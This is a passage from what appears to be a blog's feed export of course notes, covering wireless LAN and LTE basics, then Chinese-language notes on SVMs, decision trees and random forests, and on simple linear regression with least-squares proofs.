taxonomy</h3><ul><li><div align="center"><img src="/pic/168.png" width="100%" height="100%"></div></li></ul><h3 id="Wireless-link-characteristics"><a href="#Wireless-link-characteristics" class="headerlink" title="Wireless link characteristics"></a>Wireless link characteristics</h3><ul><li>Differences from wired link:<ul><li><strong>decreased signal strength</strong></li><li><strong>interference</strong> from other sources</li><li><strong>multipath propagation</strong></li></ul></li><li><strong>SNR</strong> (signal-to-noise ratio)<ul><li><strong>given physical layer</strong>: increase power $\rightarrow$ increase SNR $\rightarrow$ decrease BER</li><li><strong>given SNR</strong>: choose physical layer to meet BER requirement, giving highest throughput</li></ul></li><li><strong>Hidden terminal problem &amp; Signal attenuation</strong></li></ul><h3 id="IEEE-802-11-Wireless-LAN"><a href="#IEEE-802-11-Wireless-LAN" class="headerlink" title="IEEE 802.11 Wireless LAN"></a>IEEE 802.11 Wireless LAN</h3><ul><li><p>BSS (Basic Service Set)</p><ul><li>wireless hosts</li><li>access point: base station</li></ul></li><li><p><strong>Active scanning</strong>: </p><ul><li><strong>Probe Request frame</strong> broadcast from H1</li><li><strong>Probe Response frames</strong> sent from APs</li><li>Association Request frame sent to selected AP </li><li>Association Response frame sent from selected AP to H1</li></ul></li><li><p><strong>Passive scanning</strong>:</p><ul><li><strong>Beacon frames</strong> sent from APs</li><li>Association Request frame sent to selected AP </li><li>Association Response frame sent from selected AP to H1</li></ul></li><li><p><strong>CSMA/CA</strong></p>  <div align="center"><img src="/pic/169.png" width="100%" height="100%"></div>  <div align="center"><img src="/pic/170.png" width="100%" height="100%"></div><ul><li>difficult to sense collisions: weak received signal due to fading</li><li>can’t sense all collisions in any case: hidden terminal, fading</li></ul></li><li><p>802.11 frame</p>  <div align="center"><img src="/pic/171.png" width="100%" height="100%"></div>  <div align="center"><img src="/pic/172.png" width="100%" height="100%"></div></li><li><p>Advanced capabilities:</p><ul><li><strong>Rate adaptation</strong><ul><li>dynamically change transmission rate as mobile moves</li><li>BER becomes too high, switch to lower transmission rate but with lower BER</li></ul></li><li><strong>Power management</strong><ul><li>beacon frame contains list of mobiles with AP-to-mobile frames waiting to be sent</li></ul></li></ul></li><li><p><strong>Bluetooth</strong> (Personal area networks)</p><ul><li><strong>replacement for cables</strong></li><li><strong>ad hoc</strong>: no infrastructure</li><li>master <strong>polls</strong> clients, grants requests for client transmissions</li><li><strong>parked mode</strong>: clients can park and later wakeup</li><li><strong>bootstrapping</strong>: nodes self-assemble into piconet (plug and play)</li></ul></li></ul><h3 id="4G-LTE-Network"><a href="#4G-LTE-Network" class="headerlink" title="4G LTE Network"></a>4G LTE Network</h3><ul><li>LTE data plane protocol stack<ul><li><strong>Packet Data Convergence</strong>: header compression, encryption</li><li><strong>Radio Link Control Protocol</strong>: fragmentation/reassembly </li><li><strong>Medium Access</strong>: requesting, use of radio transmission slots</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>人工智能导论 笔记4</title>
      <link href="/2023/06/04/ren-gong-zhi-neng-dao-lun-bi-ji-4/"/>
      <url>/2023/06/04/ren-gong-zhi-neng-dao-lun-bi-ji-4/</url>
      
        <content type="html"><![CDATA[<h1 id="第四章-统计机器学习"><a href="#第四章-统计机器学习" class="headerlink" title="第四章 统计机器学习"></a>第四章 统计机器学习</h1><h2 id="统计机器学习"><a href="#统计机器学习" class="headerlink" title="统计机器学习"></a>统计机器学习</h2><ul><li><p>如果一个系统能够通过执行某个过程改进它的<strong>性能</strong>, 这就是学习.</p></li><li><p>统计学习就是计算机系统通过运用<strong>数据及统计方法</strong>提高系统性能的机器学习.</p></li><li><p>统计学习从<strong>数据</strong>出发, 提取特征, 抽象模型, 发现知识, 回到分析与预测.</p></li><li><p>统计学习的目标就是考虑学习什么样的模型和如何学习, 以使模型能对数据进行准确的预测和分析, 具有<strong>优秀的理论基础与可解释性</strong>.</p>  <div align="center"><img src="/pic/128.png" width="100%" height="100%"></div><p>  其中 $x_i$ 为<strong>特征</strong>, $y_i$ 为<strong>标签</strong>. <strong>学习算法</strong> <strong>A</strong> 根据<strong>训练集</strong> <strong>D</strong> 从<strong>假设空间</strong> <strong>H</strong> 中选择一个<strong>最好的</strong> $g\approx f$.</p></li><li><p><strong>统计学习三要素:</strong></p><ul><li><strong>模型</strong>: 学习什么样的模型.<ul><li>条件概率分布、决策函数.</li></ul></li><li><strong>策略</strong>: 模型选择的准则.<ul><li>经验风险最小化、结构风险最小化.</li></ul></li><li><strong>算法</strong>: 模型学习的算法.<ul><li>一般归结为一个<strong>最优化问题</strong>.</li></ul></li></ul></li><li><p><strong>统计机器学习分类: </strong></p><ul><li><strong>监督</strong>学习: 有标签、人为标注 (汉字识别、动物识别).</li><li><strong>非监督</strong>学习: 无标签 (图片归类).</li><li><strong>自监督</strong>学习: 非监督学习的一种 (神经网络语言模型).</li><li><strong>半监督</strong>学习: 综合监督与非监督学习.</li><li><strong>弱监督</strong>学习: 强化学习 (围棋训练).</li></ul></li></ul><h2 id="支持向量机-SVM"><a href="#支持向量机-SVM" class="headerlink" title="支持向量机 (SVM)"></a>支持向量机 (SVM)</h2><ul><li><p><strong>定义:</strong></p><ul><li><strong>二类分类器</strong>: 经过组合可解决多分类问题.</li><li>特征空间上的<strong>间隔最大化线性分类器</strong>.</li><li>通过<strong>核技巧</strong>可实现<strong>非线性分类</strong>.</li><li>根据模型的复杂程度划分.</li></ul></li><li><p><strong>线性可分支持向量机</strong>:</p>  <div align="center"><img src="/pic/129.png" width="100%" height="100%"></div><p>  通过<strong>间隔最大化</strong>得到分类超平面:</p><script type="math/tex; mode=display">  w^*\cdot x+b^*=0.</script><p>  相应的决策函数:</p><script type="math/tex; mode=display">  f(x)=sign(w^*\cdot x+b^*).</script><p>  <strong>函数间隔</strong>:</p><script type="math/tex; mode=display">  \hat\gamma_i=y_i(w\cdot x_i+b)\Rightarrow\hat\gamma=\min_{i}\hat\gamma_i.</script><p>  <strong>几何间隔</strong>:</p><script type="math/tex; mode=display">  \gamma_i=y_i(\dfrac{w}{\Vert w\Vert}\cdot x_i+\dfrac{b}{\Vert w\Vert})\Rightarrow\gamma=\min_{i}\gamma_i.</script><p>  <strong>间隔最大化</strong>问题:</p><script type="math/tex; mode=display">  \max_{w,b}\gamma\quad s.t.\quad y_i(\dfrac{w}{\Vert w\Vert}\cdot x_i+\dfrac{b}{\Vert w\Vert})\ge\gamma,\,1\le i\le N.</script><p>  转化为<strong>凸二次规划问题</strong>:</p><script type="math/tex; mode=display">  \min_{w,b}\dfrac{1}{2}\Vert w\Vert^2\quad s.t.\quad y_i(w\cdot x_i+b)\ge 1,\,1\le i\le N.</script><p>  定义<strong>拉格朗日函数</strong>:</p><script type="math/tex; mode=display">  L(w,b,\alpha)=\dfrac{1}{2}\Vert w\Vert^2+\sum_{i=1}^{N}\alpha_i[1-y_i(w\cdot x_i+b)],\,\alpha_i\ge 0,\,1\le i\le N.</script><p>  下列命题与原命题<strong>等价</strong>:</p><script type="math/tex; mode=display">  \min_{w,b}\max_{\alpha}L(w,b,\alpha).</script><p>  满足<strong>KKT</strong>条件时, <strong>对偶命题</strong>与原命题<strong>等价</strong>:</p><script type="math/tex; mode=display">  \min_{w,b}\max_{\alpha}L(w,b,\alpha)=\max_{\alpha}\min_{w,b}L(w,b,\alpha).</script><p>  对 $w, b$ 求偏导令其为 0 并代入, 得到<strong>对偶问题</strong>:</p><script type="math/tex; mode=display">  \min_{\alpha}\Big(\dfrac{1}{2}\sum_{i=1}^{N}\sum_{j=1}^{N}\alpha_i\alpha_jy_iy_j(x_i\cdot x_j)-\sum_{i=1}^{N}\alpha_i\Big)\quad s.t.\quad \sum_{i=1}^{N}\alpha_iy_i=0.</script><p>  获得 $w^<em>,b^</em>$:</p>  <div align="center"><img src="/pic/130.png" width="100%" height="100%"></div><p>  <strong>与 $\alpha_i&gt;0$ 对应的实例 $x_i$ 就是支持向量.</strong></p></li><li><p><strong>线性支持向量机</strong>:</p>  <div align="center"><img src="/pic/131.png" width="100%" height="100%"></div><p>  转化为<strong>凸二次规划</strong>问题:</p><script type="math/tex; mode=display">  \min_{w,b}(\dfrac{1}{2}\Vert w\Vert^2+C\sum_{i=1}^{N}\xi_i)\quad s.t.\quad y_i(w\cdot x_i+b)\ge 1-\xi_i,\,1\le i\le N.</script><p>  得到<strong>对偶问题</strong>:</p><script type="math/tex; mode=display">  \min_{\alpha}\Big(\dfrac{1}{2}\sum_{i,j=1}^{N}\alpha_i\alpha_jy_iy_j(x_i\cdot x_j)-\sum_{i=1}^{N}\alpha_i\Big)\, s.t.\,0\le\alpha_i\le C, \sum_{i=1}^{N}\alpha_iy_i=0.</script><p>  获得 $w^<em>,b^</em>$:</p>  <div align="center"><img src="/pic/132.png" width="100%" height="100%"></div><p>  <strong>与 $\alpha_i&gt;0$ 对应的实例 $x_i$ 就是支持向量.</strong></p>  <div align="center"><img src="/pic/133.png" width="100%" height="100%"></div></li><li><p><strong>非线性支持向量机</strong>:</p>  <div align="center"><img src="/pic/134.png" width="100%" height="100%"></div><p>  利用<strong>变换</strong>:</p><script type="math/tex; mode=display">  z=\phi(x)=((x^{(1)})^2,(x^{(2)})^2)^T.</script><p>  将原空间的椭圆:</p><script type="math/tex; mode=display">  w_1(x^{(1)})^2+w_2(x^{(2)})^2+b=0</script><p>  变换为新空间的直线:</p><script type="math/tex; mode=display">  w_1z^{(1)}+w_2z^{(2)}+b=0.</script><p>  通过一个<strong>非线性变换</strong>将<strong>输入空间 $X$</strong> 对应于一个<strong>特征空间 $H$</strong> 使, 得在输入空间 $X$ 的<strong>超曲面模型</strong>对应于特征空间 $H$ 中的<strong>超平面模型</strong>. 分类问题的学习就可以通过<strong>在 $H$ 空间中求解线性支持向量机</strong>完成.</p><p>  得到对偶问题:</p><script type="math/tex; mode=display">  \min_{\alpha}\Big(\dfrac{1}{2}\sum_{i,j=1}^{N}\alpha_i\alpha_jy_iy_jK(x_i,x_j)-\sum_{i=1}^{N}\alpha_i\Big) s.t.\,0\le\alpha_i\le C, \sum_{i=1}^{N}\alpha_iy_i=0.</script><p>  常见<strong>核函数</strong>为:</p><ul><li><p>内积核函数</p><script type="math/tex; mode=display">K(x,z)=(x\cdot z)^2.</script></li><li><p>多项式核函数</p><script type="math/tex; mode=display">K(x,z)=(x\cdot z+1)^p.</script></li><li><p>高斯核函数</p><ul><li><strong>$\sigma$ 过大: 欠拟合;</strong></li><li><strong>$\sigma$ 恰当: 恰拟合;</strong></li><li><strong>$\sigma$ 过小: 过拟合.</strong></li></ul><script type="math/tex; mode=display">K(x,z)=\exp\big(-\dfrac{\Vert x-z\Vert^2}{2\sigma^2}\big).</script><p>得到<strong>最终对偶问题</strong>:</p><script type="math/tex; mode=display">\min_{\alpha}\Big(\dfrac{1}{2}\sum_{i,j=1}^{N}\alpha_i\alpha_jy_iy_jK(x_i,x_j)-\sum_{i=1}^{N}\alpha_i\Big)\, s.t.\,\alpha_i\le C, \sum_{i=1}^{N}\alpha_iy_i=0.</script><p>获得 $w^<em>,b^</em>$:</p><div align="center"><img src="/pic/135.png" width="100%" height="100%"></div><p>其中 <strong>$w$ 无法直接得到</strong>, 此时情况为<strong>超曲面</strong>.</p></li></ul></li><li><p><strong>序列最小最优化算法 SMO</strong>:</p><ul><li>支持向量机的学习问题是一个<strong>凸二次规划问题</strong>, 具有<strong>全局最优解</strong>.</li><li>是一种<strong>快速算法</strong>.</li></ul></li><li><p><strong>SVM</strong>求解<strong>多类问题</strong>:</p><ul><li><strong>一对多</strong>: <strong>某类为正例, 其余类为负例</strong>. 分类时将未知样本分类为具有最大分类函数值的那类 (<strong>样本不均衡</strong>).</li><li><strong>一对一</strong>: <strong>任两类构造</strong> <strong>SVM</strong>, 采取<strong>投票法</strong>决定类别 (效果好、数量大).</li><li><strong>层次法</strong>: 所有类<strong>先分成两类</strong>, <strong>每类再分为两类</strong>, 以此类推.</li></ul></li></ul><h2 id="决策树"><a href="#决策树" class="headerlink" title="决策树"></a>决策树</h2><ul><li><p>对实例分类的树形结构. <strong>内部</strong>节点表示一个<strong>特征或属性</strong>, <strong>叶</strong>节点表示一个<strong>类</strong>.</p></li><li><p><strong>决策树学习</strong>:</p><ul><li>从训练集归纳出分类规则, 得到与训练集矛盾较小的决策树.</li><li>对给定训练集, 可构造多个决策树, 以损失函数最小化作为优化目标.</li><li>选取<strong>最优决策树</strong>是一个 <strong>NPC</strong> 问题, 一般采用启发式方法得到近似解.</li></ul></li><li><p><strong>决策树学习</strong>——<strong>特征选择</strong>:</p><ul><li><p>按照<strong>信息增益</strong>选择特征.</p></li><li><p><strong>熵</strong>表示数据的混乱程度, <strong>条件熵</strong>表示已知条件下数据的不确定性.</p><ul><li><p>随机变量 $X$ 的<strong>熵</strong>:</p><script type="math/tex; mode=display">  H(X)=-\sum_{i=1}^{n}p_i\log p_i.</script><p>  当条件由数据集 $D$ 估计得到时, 记为 $H(D)$.</p></li><li><p><strong>条件熵</strong>:</p><script type="math/tex; mode=display">  H(Y\mid X)=\sum_{i=1}^{n}p_iH(Y\mid X=x_i).</script><p>  表示已知 $X$ 时 $Y$ 的不确定性.</p></li></ul></li><li><p><strong>信息增益</strong>是特征 <strong>A</strong> 对数据集 <strong>D</strong> 进行分类不确定性的减少程度.</p><script type="math/tex; mode=display">  g(D,A)=H(D)-H(D\mid A).</script><p>  <strong>信息增益大</strong>的特征具有<strong>更强的分类能力</strong>.</p></li><li><p>设<strong>训练集</strong> $D$, $K$ 个<strong>类</strong> $C_k$, <strong>特征</strong> $A$ 有 $n$ 个不同的取值 $\{a_1,\cdots,a_n\}$. $A$ 的<strong>不同取值</strong>将 $D$ 划分为 $n$ 个子集 $D_1$, $\cdots$, $D_n$, $D_i$ 中<strong>属于类</strong> $C_k$ 的<strong>样本</strong>的集合为 $D_{ik}$, $\vert\cdot\vert$ 表示<strong>样本个数</strong>. 计算<strong>信息增益</strong>:</p><script type="math/tex; mode=display">  H(D)=-\sum_{k=1}^{K}\dfrac{\vert C_k\vert}{\vert D\vert}\log_2\dfrac{\vert C_k\vert}{\vert D\vert}.\\  H(D\mid A)=\sum_{i=1}^{n}\dfrac{\vert D_i\vert}{\vert D\vert}H(D_i)=-\sum_{i=1}^{n}\dfrac{\vert D_i\vert}{\vert D\vert}\sum_{k=1}^{K}\dfrac{\vert D_{ik}\vert}{\vert D_i\vert}\log_2\dfrac{\vert D_{ik}\vert}{\vert D_i\vert}.</script></li></ul></li><li><p><strong>决策树学习</strong>——<strong>决策树的生成</strong>:</p><ul><li><p><strong>ID3 算法</strong>:</p><ul><li>输入: <strong>训练集</strong> $D$, <strong>特征集</strong> $A$, 阈值 $\varepsilon$ &gt;0.</li><li>输出: <strong>决策树</strong> $T$.</li></ul><ol><li>若 $D$ 中所有实例<strong>属于同一类</strong> $C_k$, 则 $T$ 为<strong>单节点树</strong>, $C_k$ 为<strong>该节点类标记</strong>, 返回 $T$.</li><li>若 $A$ 为<strong>空</strong>, 则 $T$ 为<strong>单节点树</strong>, $D$ 中<strong>实例数最大</strong>的类 $C_k$ 为<strong>该节点类标记</strong>, 返回 $T$.</li><li>否则计算 $A$ 中<strong>各特征</strong>对 $D$ 的<strong>信息增益</strong>. 选择<strong>最大的特征</strong> $A_g$.</li><li>如果 $A_g$ <strong>信息增益小于阈值</strong>, 则置 $T$ 为<strong>单节点树</strong>, 将 $D$ 中<strong>实例数最大</strong>的类 $C_k$ 作为<strong>该节点类标记</strong>, 返回 $T$.</li><li>否则对 $A_g$ 的<strong>每一可能值</strong> $a_i$, 依 $A_g=a_i$ 将<strong>分割</strong>为 $D$ 若干子集 $D_i$, 作为 $D$ 的<strong>子节点</strong>.</li><li>对于 $D$ 的每个<strong>子节点</strong> $D_i$, 如果 $D_i$ <strong>为空</strong>, 则将 $D$ 中<strong>实例数最大</strong>的类作为<strong>标记</strong>, 构建子节点.</li><li>否则以 $D_i$ 为<strong>训练集</strong>, 以 $A-\{A_g\}$为<strong>特征集</strong>, <strong>递归地调用</strong>得到子树 $T_i$, 返回 $T_i$.</li></ol><ul><li><p>不足: <strong>信息增益</strong>倾向于选择<strong>分枝比较多的属性</strong>.</p></li><li><p>解决: <strong>信息增益比</strong>. $A$ 为属性, $A$ 的不同取值将 $D$ 划分为 $n$ 个子集 $D_1$, $\cdots$, $D_n$.</p><script type="math/tex; mode=display">  g_R(D,A)=\dfrac{g(D,A)}{H_A(D)}.\\  H_A(D)=-\sum_{k=1}^{n}\dfrac{\vert D_k\vert}{\vert D\vert}\log_2\dfrac{\vert D_k\vert}{\vert D\vert}.</script></li></ul></li><li><p><strong>C4.5 算法</strong>:</p><ul><li>除了根据信息增益比选择特征外, <strong>C4.5</strong> 算法与 <strong>ID3</strong> 基本一样.</li><li>增加了对<strong>连续值属性</strong>的处理, 对于连续值属性 <strong>A</strong>, 找到一个属性值 $a_0$, 将 $\le a_0$ 的划分到左子树, $＞a_0$ 的划分到右子树.</li><li>不足: <strong>信息增益比</strong>倾向于选择<strong>分割不均匀的特征</strong>, 轻重不均匀.</li><li>解决: 先选择 <strong>n</strong> 个<strong>信息增益大</strong>的特征, 再从这 <strong>n</strong> 个特征中选择<strong>信息增益比最大</strong>的特征.</li></ul></li></ul></li><li><p><strong>决策树学习</strong>——<strong>决策树的剪枝</strong>:</p><ul><li><p>为防止出现<strong>过拟合</strong>, 对决策树进行简化的过程称为<strong>剪枝</strong>. 从已经生成的树上裁掉一些子树或者叶节点, 将其父节点作为新的叶节点, 用<strong>实例数最大的类别作为标记</strong>.</p></li><li><p>这种生成树再剪枝的方法称为<strong>后剪枝</strong>.</p></li><li><p>当<strong>数据量大</strong>时:</p><ul><li>将数据划分为训练集、验证集和测试集.</li><li>用训练集训练得到决策树.</li><li>从下向上逐步剪枝, 在验证集上测试性能, 直到性能下降为止.</li><li>最后在测试集上的性能作为系统的性能.</li></ul></li><li><p>当<strong>数据量小</strong>时:</p><ul><li><p>直接利用训练集进行剪枝.</p></li><li><p>树 $T$ 的<strong>叶节点</strong>个数为 $\vert T\vert$, $t$ 是树 $T$ 的叶节点, 该节点有 $N_t$ 个<strong>样本</strong>, 其中 $k$ 类的<strong>样本点</strong>有 $N_{tk}$ 个 ($k=1,\cdots,K$). $H_t(T)$ 为叶节点 $t$ 上的<strong>经验熵</strong>, $a\ge 0$ 为参数.</p><script type="math/tex; mode=display">  C_a(T)=\sum_{t=1}^{\vert T\vert}N_tH_t(T)+a\vert T\vert.\\  C(T)=\sum_{t=1}^{\vert T\vert}N_tH_t(T)=-\sum_{t=1}^{\vert T\vert}\sum_{k=1}^{K}N_{tk}\log\dfrac{N_{tk}}{N_t}.</script><p>  其中 $C(T)$ 表示对<strong>训练数据的预测误差</strong>, $\vert T\vert$ 表示模型的<strong>复杂程度</strong>.</p></li></ul></li><li><p><strong>剪枝</strong>就是当 $a$ 确定时, 选择损失函数最小的模型.</p><ul><li>输入: 生成算法产生的<strong>整个树</strong> $T$, <strong>参数</strong> $a$.</li><li>输出: 修剪后的<strong>子树</strong> $T_a$.</li></ul><ol><li>计算每个节点的<strong>经验熵</strong>.</li><li><strong>递归</strong>地从树的叶节点<strong>向上回缩</strong>, 如果回缩后的<strong>损失函数</strong>小于等于回缩前, 则<strong>剪枝</strong>将父节点变为新的叶节点.</li><li><strong>返回 2</strong>, 直至不能继续为止, 得到<strong>损失函数最小</strong>的子树 $T_a$.</li></ol></li></ul></li><li><p><strong>随机森林</strong>:</p><ul><li>决策树容易过拟合.</li><li>随机森林是由多个决策树组成的分类器.</li><li>通过投票机制改善决策树.</li><li>单个决策树的生成:<ul><li>有放回的数据采样.</li><li>属性 (特征) 的采样.</li></ul></li><li>集外数据的使用:<ul><li>单个决策树未用到的数据.</li></ul></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> IAI </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IAI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>概率论与数理统计 笔记8</title>
      <link href="/2023/05/28/gai-lu-lun-yu-shu-li-tong-ji-bi-ji-8/"/>
      <url>/2023/05/28/gai-lu-lun-yu-shu-li-tong-ji-bi-ji-8/</url>
      
        <content type="html"><![CDATA[<h1 id="Chap-8-线性回归"><a href="#Chap-8-线性回归" class="headerlink" title="Chap 8 线性回归"></a>Chap 8 线性回归</h1><h2 id="回归问题"><a href="#回归问题" class="headerlink" title="回归问题"></a>回归问题</h2><ul><li><p><strong>定义</strong>  </p><script type="math/tex; mode=display">  Y=f(X_1,\cdots,X_n)+\varepsilon.</script><ul><li>$Y$ — 因变量(响应变量).</li><li>$X_1,\cdots,X_n$ — 自变量(回归变量).</li><li><p>$\varepsilon$ — 随机误差(无法测量或不重要的因素).</p><p>假定 $E(\varepsilon\mid X_1,\cdots,X_n)=0$,</p><script type="math/tex; mode=display">\Rightarrow E(Y\mid X_1,\cdots,X_n)=f(X_1,\cdots,X_n).</script><p>称为 $Y$ 对 $X_1,\cdots,X_n$ 的回归函数. 由样本数据 $X_1,\cdots,X_n,Y$ 获取 $f$ 的过程称为回归(有监督学习).</p></li></ul></li><li><p><strong>注</strong>  </p><ul><li>$X_1,\cdots,X_n$ 可以是随机的(<strong>e.g.</strong> 随机抽取一人的身高、体重等).</li><li>$X_1,\cdots,X_n$ 也可以是非随机的控制变量(<strong>e.g.</strong> 施肥量、药品使用剂量).</li><li>在应用中, 自变量一律视为非随机的.</li></ul></li><li><p><strong>假设</strong>  $E(\varepsilon)=0$, $Var(\varepsilon)=\sigma^2$ (未知).</p></li><li><p><strong>注</strong>  要素是否完全、$f$ 的形式是否准确关乎 $\sigma^2$ 的大小.</p></li></ul><h2 id="简单线性回归"><a href="#简单线性回归" class="headerlink" title="简单线性回归"></a>简单线性回归</h2><ul><li><p><strong>定义</strong></p><script type="math/tex; mode=display">  Y=\beta_0+\beta_1 X+\varepsilon.</script><p>  这是<strong>理论模型</strong>, 提供背景作用. 其中回归参数(未知待定):</p><ul><li>$\beta_0$ — 截距.</li><li><p>$\beta_1$ — 斜率(回归系数).</p><p>对 $(X,Y)$ 进行 $n$ 次独立观测, 得到样本观测值 $(x_1,y_1),\cdots,(x_n,y_n)$. 则</p><script type="math/tex; mode=display">y_i=\beta_0+\beta_1 x_i+\varepsilon_i\,(1\le i\le n).</script><p>其中 $\varepsilon_i$ 作为第 $i$ 次观测的随机误差, 无法直接观测得到. 不妨认为</p><script type="math/tex; mode=display">\begin{cases}E(\varepsilon_i)=0,\\\\Var(\varepsilon_i)=\sigma^2.\end{cases}</script><p>这是<strong>简单线性回归模型</strong>. 其中:</p></li><li><p>$E(y_i)=\beta_0+\beta_1 x_i$.</p></li><li>$Var(y_i)=\sigma^2$.</li></ul></li><li><p><strong>注</strong></p><ul><li><strong>简单</strong>: $n=1$.</li><li><strong>线性</strong>: $f$ 关于参数 $\beta_0$, $\beta_1$ 线性.</li></ul></li></ul><h2 id="最小二乘法-LS-估计参数"><a href="#最小二乘法-LS-估计参数" class="headerlink" title="最小二乘法 (LS) 估计参数"></a>最小二乘法 (LS) 估计参数</h2><ul><li><p><strong>定义</strong></p><script type="math/tex; mode=display">  S(\beta_0,\beta_1)=\sum_{i=1}^{n}(y_i-(\beta_0+\beta_1 x_i))^2.</script><p>  最小化 $S(\beta_0,\beta_1)$, 得</p><ul><li>$\hat\beta_1=\dfrac{\sum\limits_{i=1}^{n}(x_i-\overline{x})(y_i-\overline{y})}{\sum\limits_{i=1}^{n}(x_i-\overline{x})^2}=\dfrac{\sum\limits_{i=1}^{n}(x_i-\overline{x})y_i}{S_{xx}}$ ($y_i$ 的线性组合).</li><li>$\hat\beta_0=\overline{y}-\hat\beta_1\overline{x}=\sum\limits_{i=1}^{n}(\dfrac{1}{n}-\dfrac{(x_i-\overline{x})\overline{x}}{S_{xx}})y_i$ ($y_i$ 的线性组合).</li><li>$y=\hat\beta_0+\hat\beta_1 x$ (拟合直线).</li></ul></li><li><p><strong>注</strong></p><ul><li>损失函数: $(y-(\beta_0+\beta_1 x))^2$.</li><li>线性模型是否合理.</li></ul></li><li><p><strong>命题</strong>  $\hat\beta_0$, $\hat\beta_1$ 分别为 $\beta_0$, $\beta_1$ 的无偏估计.</p></li><li><p><strong>证明</strong>  </p><script type="math/tex; mode=display">  \begin{aligned}  E(\hat\beta_1)&=\dfrac{\sum_{i=1}^{n}(x_i-\overline{x})E(y_i)}{S_{xx}}\\  &=\dfrac{\sum_{i=1}^{n}(x_i-\overline{x})(\beta_0+\beta_1 x_i)}{S_{xx}}\\  &=\beta_1\dfrac{\sum_{i=1}^{n}(x_i-\overline{x})x_i}{S_{xx}}\\  &=\beta_1\dfrac{\sum_{i=1}^{n}(x_i-\overline{x})^2}{S_{xx}}\\  &=\beta_1.  \end{aligned}</script><script type="math/tex; mode=display">  \begin{aligned}  E(\hat\beta_0)&=E(\overline{y}-\hat\beta_1\overline{x})\\  &=\dfrac{1}{n}\sum_{i=1}^{n}E(y_i)-E(\hat\beta_1)\overline{x}\\  &=\dfrac{1}{n}\sum_{i=1}^{n}(\beta_0+\beta_1 x_i)-\beta_1\overline{x}\\  &=\beta_0.  \end{aligned}</script><script type="math/tex; mode=display">  \begin{aligned}  Var(\hat\beta_1)&=Var\Big(\dfrac{\sum_{i=1}^{n}(x_i-\overline{x})y_i}{S_{xx}}\Big)\\  &=\dfrac{\sum_{i=1}^{n}(x_i-\overline{x})^2}{S_{xx}^2}Var(y_i)\\  &=\dfrac{\sigma^2}{S_{xx}}.  \end{aligned}</script><script type="math/tex; mode=display">  \begin{aligned}  Var(\hat\beta_0)&=Var\Big(\sum\limits_{i=1}^{n}(\dfrac{1}{n}-\dfrac{(x_i-\overline{x})\overline{x}}{S_{xx}})y_i\Big)\\  &=\sum\limits_{i=1}^{n}(\dfrac{1}{n}-\dfrac{(x_i-\overline{x})\overline{x}}{S_{xx}})^2 Var(y_i)\\  &=(\dfrac{1}{n}+\dfrac{\overline{x}^2}{S_{xx}})\sigma^2\\  &=\dfrac{\sigma^2}{S_{xx}}\cdot\dfrac{\sum_{i=1}^{n}x_i^2}{n}.  \end{aligned}</script></li><li><p><strong>注</strong>  中心化处理:</p><script type="math/tex; mode=display">  y_i=\beta_0+\beta_1\overline{x}+\beta_1(x_i-\overline{x})+\varepsilon_i.</script><p>  此时常数项 $\beta_0+\beta_1\overline{x}$ 的估计 $=\hat\beta_0+\hat\beta_1\overline{x}=\overline{y}$.</p></li><li><p><strong>定义(残差)</strong>  当 $X=x_i$ 时, 拟合直线上相应点为 $(x_i,\hat\beta_0+\hat\beta_1 x_i)$.</p><p>  记 $\hat{y}_i=\hat\beta_0+\hat\beta_1 x_i$, 称为 $x_i$ 处的拟合值. 定义残差 $y_i-\hat{y}_i$. 考虑残差平方和</p><script type="math/tex; mode=display">  SSE:=\sum_{i=1}^{n}(y_i-\hat y_i)^2=\sum_{i=1}^{n}(y_i-(\hat\beta_0+\hat\beta_1 x_i))^2.</script></li><li><p><strong>命题</strong>  $\hat\sigma^2:=\dfrac{SSE}{n-2}$ 为 $\sigma^2$ 的无偏估计. 此时</p><ul><li>$\hat{se}(\hat\beta_1)=\dfrac{\hat\sigma}{\sqrt{S_{xx}}}$.</li><li>$\hat{se}(\hat\beta_0)=\hat\sigma\sqrt{\dfrac{1}{n}+\dfrac{\overline{x}^2}{S_{xx}}}$.</li></ul></li></ul><h2 id="回归参数推断"><a href="#回归参数推断" class="headerlink" title="回归参数推断"></a>回归参数推断</h2><ul><li><p><strong>追加假设</strong>  $\varepsilon_i\sim N(0,\sigma^2)$, $1\le i\le n$.</p></li><li><p><strong>注</strong></p><ul><li><p>$y_i\sim N(\beta_0+\beta_1 x_i,\sigma^2)$ 独立, $1\le i\le n$.</p></li><li><p><strong>MLE</strong>$(\beta_0^<em>,\beta_1^</em>)=(\hat\beta_0,\hat\beta_1)$ (<strong>习题课 5</strong>).</p><p>  $L(\beta_0,\beta_1,\sigma^2)=\prod\limits_{i=1}^{n}\dfrac{1}{\sqrt{2\pi}\sigma}e^{-\tfrac{(y_i-(\beta_0+\beta_1 x_i))^2}{2\sigma^2}}$.</p><p>  $(\sigma^2)^*=\dfrac{SSE}{n}$.</p></li></ul></li><li><p><strong>定义(假设检验)</strong>  $H_0:\beta_1=0$ <strong>v.s.</strong> $H_1:\beta_1\ne 0$. 因为 $\hat\beta_1$ 为 $y_i$ 的线性组合. 得到</p><script type="math/tex; mode=display">  \dfrac{\hat\beta_1-\beta_1}{\tfrac{\sigma}{\sqrt{S_{xx}}}}\sim N(0,1)</script><p>  可证明</p><script type="math/tex; mode=display">  \dfrac{SSE}{\sigma^2}=\dfrac{(n-2)\hat\sigma^2}{\sigma^2}\sim\chi^2(n-2).</script><p>  从而</p><script type="math/tex; mode=display">  \dfrac{\hat\beta_1-\beta_1}{\hat{se}(\hat\beta_1)}=\dfrac{\hat\beta_1-\beta_1}{\tfrac{\hat\sigma}{\sqrt{S_{xx}}}}=\dfrac{\hat\beta_1-\beta_1}{\tfrac{\sigma}{\sqrt{S_{xx}}}}/\sqrt{\dfrac{(n-2)\hat\sigma^2}{(n-2)\sigma^2}}\sim t(n-2).</script><p>  检验统计量:</p><script type="math/tex; mode=display">  T=\dfrac{\hat\beta_1}{\hat{se}(\hat\beta_1)}.</script><p>  当 $H_0$ 为真时, $T\sim t(n-2)$. 检验准则为: 当 $\vert T\vert\ge t_{\tfrac{\alpha}{2}}(n-2)$ 时拒绝 $H_0$.</p></li><li><p><strong>注</strong></p><ul><li>可以对其他的 $\beta_1$ 可能值进行检验.</li><li>可以对 $\beta_1$ 进行区间估计.</li><li>可以对 